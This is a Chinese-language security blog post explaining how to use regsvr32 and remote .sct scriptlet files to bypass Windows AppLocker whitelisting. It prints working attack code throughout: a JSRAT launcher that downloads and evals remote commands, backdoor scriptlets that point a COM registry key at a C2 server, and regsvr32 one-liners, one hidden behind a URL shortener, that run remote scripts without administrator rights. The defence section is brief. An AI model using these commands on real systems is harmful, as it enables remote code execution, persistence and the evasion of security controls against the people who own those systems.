# Use SCT to Bypass Application Whitelisting Protection

0x00 前言
=======

* * *

最近CaseySmith@subTee分享了一个好玩儿的技巧，利用sct文件来实现的持久机制。 我对此也很感兴趣,于是对相关的内容作了研究学习，在学习过程中Casey Smith又教会了我很多，学会了一个绕过应用程序白名单的技巧，所以在此将学到的知识整理一下。

![enter image description here](http://drops.javaweb.org/uploads/images/725ad81565a71bf68d96e226bf8b27d001e51cb4.jpg)

链接如下：

[https://github.com/subTee/SCTPersistence](https://github.com/subTee/SCTPersistence)

0x01 简介
=======

* * *

### Regsvr32

Regsvr32命令用于注册动态链接库文件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。**语法：**

```
regsvr32 [/u] [/s] [/n] [/i[:cmdline]] dllname 
其中dllname为activex控件文件名

```

**参数：**

```
/u
卸载已安装的控件或DLL文件
/s
静默，不显示任何消息框
/n
指定不调用 DllRegisterServer，此选项必须与 /i 共同使用
/i:cmdline
调用 DllInstall 将它传递到可选的 [cmdline]，在与 /u 共同使用时，它调用 dll 卸载
dllname
指定要注册的 dll 文件名

```

### COM组件：

以Win32动态链接库（DLL）或可执行文件（EXE）形式发布的可执行二进制代码，能够满足对组件架构的所有需求，可通过Regsvr32命令注册。

**特点：**

```
组件与开发工具语言无关
通过接口有效保证了组件的复用性
组件运行效率高、便于使用和管理

```

### Scriptlets：

在可扩展标记语言（XML）文件中通过脚本语言（VBScript或者JScript）可以创建一个COM对象，后缀名为sct

### scrobj.dll：

用来帮助将COM请求发送到脚本组件

0x02 实例
=======

* * *

### 1、Component.sct

内容如下：

```
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Component"
    progid="Component.InsideCOM"
    version="1.00"
    classid="{10001111-0000-0000-0000-000000000001}"
>
</registration>

<public>
    <method name="Sum">
        <PARAMETER name="X"/>
        <PARAMETER name="Y"/>
    </method>
</public>
<script language="VBScript">
<![CDATA[

function Sum(X, Y)
    Sum = X + Y
end function

]]>
</script>

</scriptlet>

```

### 2、通过执行Regsvr32命令注册COM组件

管理员权限执行：

```
regsvr32 /i:"Component.sct" scrobj.dll

```

![enter image description here](http://drops.javaweb.org/uploads/images/e0a04cf44c4b3a04415925388bd5134dce9eb5d5.jpg)

如图，注册后在注册表`HKEY_CLASSES_ROOT\CLSID\`下同步创建键值`{10001111-0000-0000-0000-000000000001}`

![enter image description here](http://drops.javaweb.org/uploads/images/3c0cf1fa6d9fbbbd51660eeffbbd1c0b4f090abb.jpg)

注册表键值细节如下：

```
[HKCR\CLSID\{10001111-0000-0000-0000-000000000001}]
@="Component"

[HKCR\CLSID\{10001111-0000-0000-0000-000000000001}\VersionIndependentProgID]
@="Component.InsideCOM"

[HKCR\CLSID\{10001111-0000-0000-0000-000000000001}\ProgID]
@="Component.InsideCOM.1.00"

[HKCR\CLSID\{10001111-0000-0000-0000-000000000001}\ScriptletURL]
@="file://C:\\WINDOWS\\Desktop\\Component.sct"

[HKCR\CLSID\{10001111-0000-0000-0000-000000000001}\InprocServer32]
@="C:\\WINDOWS\\SYSTEM\\SCROBJ.DLL"
"ThreadingModel"="Apartment"

```

### 3、通过vbs调用注册过的COM组件

TestVB.vbs:

```
Dim ref 
Set ref = CreateObject("Component.InsideCOM")
MsgBox ref.Sum(4, 6)

```

执行后如图，成功调用COM组件

![enter image description here](http://drops.javaweb.org/uploads/images/67ea2b01bfadbb676e1315466dbfc6b9fed51232.jpg)

### 4、补充

以上通过VBS可调用刚刚注册的COM组件"Component.InsideCOM"，也可用JScript实现

**(1)JScript实现**

ComponentJS.sct： ([https://github.com/subTee/SCTPersistence/blob/master/ComponentJS.sct](https://github.com/subTee/SCTPersistence/blob/master/ComponentJS.sct))

```
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Component"
    progid="Component.InsideCOMJS"
    version="1.00"
    classid="{10001111-0000-0000-0000-000000000002}"
>
</registration>

<public>
    <method name="Sum">
        <PARAMETER name="X"/>
        <PARAMETER name="Y"/>
    </method>
</public>
<script language="JScript">
<![CDATA[

function Sum(X, Y) {
    var result = X + Y;
    return result;
    }
]]>
</script>

</scriptlet>

```

TestJS.js: ([https://github.com/subTee/SCTPersistence/blob/master/TestJS.js](https://github.com/subTee/SCTPersistence/blob/master/TestJS.js))

```
var ref = new ActiveXObject("Component.InsideCOMJS");
var x = ref.Sum(4,6);
WScript.Echo(x);

```

**(2)可修改注册表键值以此更改COM组件内容**

COM组件的文件路径如下：

```
[HKCR\CLSID\{10001111-0000-0000-0000-000000000001}\ScriptletURL]
@="file://C:\\WINDOWS\\Desktop\\Component.sct"

```

如果修改为另一脚本的路径，那么再次调用组件会运行另一个脚本的内容

**(3)文件名可简化**

后缀名不一定必须用".sct"，其他格式也可以

如

```
regsvr32 /i:"Component.txt" scrobj.dll

```

**(4)/s参数**

加入/s参数可隐藏弹出的注册成功的对话框

**(5)sct文件可放在远程服务器上**如

```
regsvr32 /s /i:http://192.168.1.1/Component.txt scrobj.dll

```

**注：**

在代理环境下也能正常访问，也支持https访问

0x03 应用1：JSRAT
==============

* * *

### 1、Casey的方法

**(1)Backdoor.sct：**

([https://github.com/subTee/SCTPersistence/blob/master/JSBackdoor/Backdoor.sct](https://github.com/subTee/SCTPersistence/blob/master/JSBackdoor/Backdoor.sct))

关键代码：

```
function C2Config() {
    //The default is to use the path to a local file... Here, I just rewrite the regkey, and now, the Class definition comes form the interwebs. Woo!
    var WshShell = new ActiveXObject("WScript.Shell");
    var strRegPath = "HKEY_CLASSES_ROOT\\CLSID\\{10001111-0000-0000-0000-00000000ACDC}\\ScriptletURL\\";
    WshShell.RegWrite(strRegPath, "http://127.0.0.1:8080/c2.js", "REG_SZ");
    }
/*
function Cleanup() { }
//Clean your room!
*/ 
function Main() {
    C2Config();
    //Cleanup();    
    }

```

当运行Backdoor.sct注册COM组件时，Backdoor.sct会将组件注册表的键值ScriptletURL设为远程服务器上的地址：http://127.0.0.1:8080/c2.js

这样的好处是Backdoor.sct文件不需要保存在系统上面，同时只要修改服务器上的c2.js的内容就可以执行不同的命令

**(2)c2.js**

([https://github.com/subTee/SCTPersistence/blob/master/JSBackdoor/c2.js](https://github.com/subTee/SCTPersistence/blob/master/JSBackdoor/c2.js)) 此文件包含要执行的js命令

**(3)BackdoorTest.js**

([https://github.com/subTee/SCTPersistence/blob/master/JSBackdoor/BackdoorTest.js](https://github.com/subTee/SCTPersistence/blob/master/JSBackdoor/BackdoorTest.js)) 用于调用已注册的COM组件，内容如下：

```
//调用Backdoor.sct中的C2Config()，将c2.js的路径写入注册表
var x = new ActiveXObject("Component.Backdoor");
x.Main();

//调用c2.js中的代码执行功能
var x = new ActiveXObject("Component.Backdoor");
x.Exec();

```

**注：**

调用方式不唯一，还可通过以下方式

**a.rundll32.exe**

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();x=new%20ActiveXObject("Component.Backdoor");x.Exec();

```

**b.powershell**

```
$s=New-Object -COM "Component.Backdoor";$s.Exec()

```

### 2、我的方法

**(1)Backdoor.sct**

([https://github.com/3gstudent/SCTPersistence/blob/master/JSBackdoor/Backdoor.sct](https://github.com/3gstudent/SCTPersistence/blob/master/JSBackdoor/Backdoor.sct)) 直接在sct文件中写入JSRAT的启动代码

细节如下：

```
function Exec()
    {
        rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try{v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);}catch(e){}h.Open(\"GET\",\"http://127.0.0.1/connect\",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}";
        new ActiveXObject("WScript.Shell").Run(rat,0,true);
    }

```

**(2)BackdoorTest.js**

([https://github.com/3gstudent/SCTPersistence/blob/master/JSBackdoor/BackdoorTest.js](https://github.com/3gstudent/SCTPersistence/blob/master/JSBackdoor/BackdoorTest.js)) 通过js脚本调用即可

当然也可以通过rundll32.exe调用，代码如下：

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();x=new%20ActiveXObject("JSRAT");x.Exec();

```

**(3)注册组件的方式**

将Backdoor.sct放在远程服务器上，通过regsvr32注册

```
regsvr32 /s /i:http://192.168.1.1/Backdoor.sct scrobj.dll

```

**(4)调用COM组件"JSRAT"**

即可启动JSRAT

0x04 应用2：绕过应用程序白名单过滤
====================

* * *

标准的xml文件的内容如下：

```
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Empire"
    progid="Empire"
    version="1.00"
    classid="{20001111-0000-0000-0000-0000FEEDACDC}"
    >
</registration>

<public>
    <method name="Exec"></method>
</public>
<script language="JScript">
<![CDATA[

    function Exec()
    {
        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
    }

]]>
</script>

</scriptlet>

```

在成功注册COM组件后，通过调用exec()才能够执行里面的功能

**那么，如果把Exec()的功能直接加到`<registration>`的标签中呢？****会不会在注册的过程中就可以调用exec()？**

以下是Casey的实现方式：

```
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Empire"
    progid="Empire"
    version="1.00"
    classid="{20001111-0000-0000-0000-0000FEEDACDC}"
    >
    <!-- regsvr32 /s /i"C:\Bypass\Backdoor.sct" scrobj.dll -->
    <!-- regsvr32 /s /i:http://server/Backdoor.sct scrobj.dll -->
    <!-- That should work over a proxy and SSL/TLS... -->
    <!-- Proof Of Concept - Casey Smith @subTee -->
    <script language="JScript">
        <![CDATA[

            var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 

        ]]>
</script>
</registration>

<public>
    <method name="Exec"></method>
</public>
<script language="JScript">
<![CDATA[

    function Exec()
    {
        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
    }

]]>
</script>

</scriptlet>

```

根据之前介绍的内容，现在来尝试注册这个COM组件：

```
regsvr32 /i https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct

```

![enter image description here](http://drops.javaweb.org/uploads/images/31aa4559a6f9058535c329d08eef7f19052d078d.jpg)

如图虽然能够成功弹出计算器，但是会弹框提示报错

但是**有趣的是**我们可以通过/s参数来忽略这个错误：

```
regsvr32 /s https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct

```

这样就能够成功执行弹出计算器

而**更有趣的是**这个COM组件仍可以被正常调用：

js文件如下：

```
var ref = new ActiveXObject("Empire");
var c=ref.Exec();

```

运行后会弹出cmd

总结以上的内容，只需执行如下代码即可执行远程服务器上的js脚本

```
regsvr32 /s https://gist.githubusercontent.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302/raw/bf04e98329ef471dcbbe621df5d61ddb4e802b63/Backdoor.sct

```

或者

```
regsvr32 /s https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct

```

如果转换思路，就会发现这种方式可以绕过应用程序白名单的过滤

0x05 进阶用法
=========

* * *

介绍到这里，你也许会认为，通过注册COM组件来绕过应用程序白名单的过滤得需要管理员权限，这会是一个鸡肋。

但是，**Casey**发现了更高级的方法：

```
不需要管理权限，同时也不需要写入注册表

```

也许回头看这个技巧很简单，但是

**能想到大家想不到的，这就不简单**

既然可以通过注册控件来绕过白名单过滤，那么通过卸载应该也可以，而且**卸载控件的操作不需要管理员权限，也不需要写入注册表**所以参数如下即可：

```
regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll

```

如图，普通用户权限，开启Windows AppLocker，成功执行js代码，弹出计算器，前面介绍的JSRAT的应用方法也可以用这种方式执行

![enter image description here](http://drops.javaweb.org/uploads/images/376c6ad1aa81fb72f5b8557188b2a6a2f4cdc925.jpg)

0x06 补充
=======

* * *

补充另一个sct的应用方法 前不久更新了JSRAT的内容，添加了自动识别代理进行通信的功能，因此JSRAT的启动代码变得更长：

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try{v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);}catch(e){}h.Open("GET","http://192.168.174.131/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}

```

这样不仅对实际使用带来不便，同时也影响了在快捷方式下的应用：

快捷方式支持的最大字符长度为260，而JSRAT的启动代码远超260，详细问题描述可见：

[https://github.com/3gstudent/Javascript-Backdoor/issues/3](https://github.com/3gstudent/Javascript-Backdoor/issues/3)

而通过sct来启动JSRAT恰恰可以解决这个问题，已将利用代码上传至github：

[https://github.com/3gstudent/SCTPersistence/blob/master/ShortJSRAT.sct](https://github.com/3gstudent/SCTPersistence/blob/master/ShortJSRAT.sct)

通过regsvr32执行服务器上的ShortJSRAT.sct文件

ShortJSRAT.sct文件包含JSRAT的启动代码

最终优化的JSRAT启动代码如下：

```
regsvr32 /s /n /u /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/ShortJSRAT.sct scrobj.dll

```

如果觉得网址过长，可使用短地址来代替上述文件URL，短地址如下：

```
regsvr32 /s /n /u /i:https://goo.gl/ijB12k scrobj.dll

```

**注：**

该短地址是通过google url shortener生成，因此国内用户无法直接访问，换用其他平台的短地址服务就好。

0x07 防御
=======

* * *

综上，这个技巧的实现需要如下限制条件：

```
能在系统上可以执行代码

```

所以应用的前提是已经获得了系统的访问权限，因此只要保护好自身系统的安全就不会被这种类似的方式攻击。至于Windows AppLocker，无法防御sct的应用。

0x08 小结
=======

* * *

引用Casey博客的一句话:

([http://subt0x10.blogspot.com/2016/04/setting-up-homestead-in-enterprise-with.html](http://subt0x10.blogspot.com/2016/04/setting-up-homestead-in-enterprise-with.html))**Well, now that everyone has eyes on PowerShell...Lets see what we can do with JavaScript!**

再次感谢CaseySmith@subTee对我研究上的帮助，十分感谢。有待研究的细节还有很多，如果你对此感兴趣，可以一起交流。

更多学习资料：

CaseySmith@subTee介绍利用SCT绕过白名单限制的博客地址，值得学习： ([http://subt0x10.blogspot.jp/2016/04/bypass-application-whitelisting-script.html](http://subt0x10.blogspot.jp/2016/04/bypass-application-whitelisting-script.html))